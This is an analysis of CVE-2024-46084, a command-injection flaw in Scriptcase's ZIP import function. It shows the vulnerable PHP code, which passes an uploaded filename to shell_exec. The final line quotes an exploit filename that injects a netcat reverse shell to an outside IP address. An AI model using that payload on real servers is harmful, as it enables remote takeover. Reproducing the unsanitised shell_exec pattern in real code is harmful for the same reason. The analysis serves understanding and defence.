Based on the provided content, here's the breakdown of CVE-2024-46084:

**Root Cause of Vulnerability:**
- The vulnerability lies within the `nm_unzip` function used in the import feature of Scriptcase. This function executes a `shell_exec` command using the `7za` binary to extract uploaded ZIP files. The filename of the uploaded file, which is user-controlled, is passed directly to the shell command without proper sanitization.

**Weaknesses/Vulnerabilities Present:**
- **Remote Code Execution (RCE):** The unsanitized input to the `shell_exec` function allows an attacker to inject arbitrary commands into the operating system.
- **Insecure use of `shell_exec`:** The function uses `shell_exec` with user-provided input without any input validation or sanitization which can lead to command injection.

**Impact of Exploitation:**
- Successful exploitation allows an attacker to execute arbitrary code on the server hosting the Scriptcase application.
- This can lead to a complete compromise of the application and the server, potentially allowing for data theft, malware installation, or further attacks on the internal network.

**Attack Vectors:**
- The attack vector is the import feature of Scriptcase, which allows users to upload ZIP files.
- The filename of the uploaded file is used directly within a shell command.

**Required Attacker Capabilities/Position:**
- The attacker needs to have an account with permissions to import projects in Scriptcase
- The attacker needs to craft a malicious ZIP filename containing shell commands.
- The attacker needs to upload the file using the import functionality.

**Technical Details:**

- The vulnerable code snippet:
```php
function nm_unzip($v_str_file, $v_str_dir)
{
    global $nm_config;
    nm_dir_create($v_str_dir);
    $_so = nm_op_sys();
    if ($_so != "mac" && is_dir($nm_config["path_prod"] . "third/zip/")) {
        $_7z = $nm_config["path_prod"] . "third/zip/";
        $dir_extract = $v_str_dir;
        $_zip_file = $v_str_file;
        // ... OS specific path selection...
        $_chold = getcwd();
        chdir($nm_config["path_tmp"]);
        shell_exec($_7z . " x " . $_zip_file . " -aos -o" . $dir_extract);
        chdir($_chold);
    } 
    // ... fallback code ...
}
```
- The filename `$v_str_file` is directly included in the `shell_exec` command without proper sanitization.
- The provided exploit uses a filename such as `"e.zip;nc -c sh 192.168.0.146 1337 #.zip"`, where the included command executes a reverse shell to the attacker's machine via netcat.
